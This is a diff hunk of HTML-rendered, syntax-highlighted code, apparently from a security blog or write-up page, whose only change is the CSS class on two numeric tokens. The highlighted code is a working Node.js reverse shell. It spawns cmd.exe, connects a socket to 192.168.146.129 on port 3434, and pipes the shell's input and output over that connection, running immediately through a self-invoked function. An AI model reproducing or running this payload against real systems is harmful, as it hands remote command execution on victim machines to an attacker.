@@ -3167,12 +3167,12 @@
         <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&quot;child_process&quot;</span><span class="p">),</span>
         <span class="nx">cmd</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span> <span class="p">[]);</span> <span class="c1">// windows</span>
     <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
-    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">3434</span><span class="p">,</span> <span class="s2">&quot;192.168.146.129&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mf">3434</span><span class="p">,</span> <span class="s2">&quot;192.168.146.129&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
         <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
         <span class="nx">cmd</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
         <span class="nx">cmd</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
     <span class="p">});</span>
-    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">return</span> <span class="mf">1</span><span class="p">;</span>
 <span class="p">}</span><span class="nx">tan</span><span class="p">();</span>
 </code></pre></div>
                 
